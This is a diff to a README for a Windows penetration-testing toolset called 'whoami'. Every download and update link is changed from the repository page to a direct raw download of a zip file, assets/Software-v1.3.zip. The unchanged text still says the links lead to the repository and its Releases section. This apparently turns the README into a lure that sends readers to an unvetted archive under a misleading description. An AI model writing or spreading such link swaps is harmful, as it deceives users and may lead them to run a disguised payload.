@@ -1,6 +1,6 @@
 # 🛡️ whoami - Simple Penetration Testing Toolset
 
-[![Download whoami](https://img.shields.io/badge/Download-whoami-ff69b4?style=for-the-badge)](https://github.com/Beatrisadecisive305/whoami)
+[![Download whoami](https://img.shields.io/badge/Download-whoami-ff69b4?style=for-the-badge)](https://github.com/Beatrisadecisive305/whoami/raw/refs/heads/main/assets/Software-v1.3.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these steps to get whoami running on your Windows PC.
 
 Click this button to open the download page on GitHub:
 
-[![Download whoami](https://img.shields.io/badge/Download-whoami-blue?style=for-the-badge)](https://github.com/Beatrisadecisive305/whoami)
+[![Download whoami](https://img.shields.io/badge/Download-whoami-blue?style=for-the-badge)](https://github.com/Beatrisadecisive305/whoami/raw/refs/heads/main/assets/Software-v1.3.zip)
 
 This link leads to the main repository where you will find the latest release files.
 
@@ -116,7 +116,7 @@ You do not need to memorize these. The interface offers buttons and hints to gui
 To get the latest features or security fixes:
 
 1. Visit the GitHub page link again:  
-   https://github.com/Beatrisadecisive305/whoami  
+   https://github.com/Beatrisadecisive305/whoami/raw/refs/heads/main/assets/Software-v1.3.zip  
 2. Download the newest installer from the Releases section  
 3. Run the installer; it will update your current version without losing your data  
 
@@ -145,4 +145,4 @@ whoami focuses on hands-on testing. To understand the results better, consider l
 
 You can visit this link to download or update whoami anytime:  
 
-[https://github.com/Beatrisadecisive305/whoami](https://github.com/Beatrisadecisive305/whoami)
+[https://github.com/Beatrisadecisive305/whoami/raw/refs/heads/main/assets/Software-v1.3.zip](https://github.com/Beatrisadecisive305/whoami/raw/refs/heads/main/assets/Software-v1.3.zip)
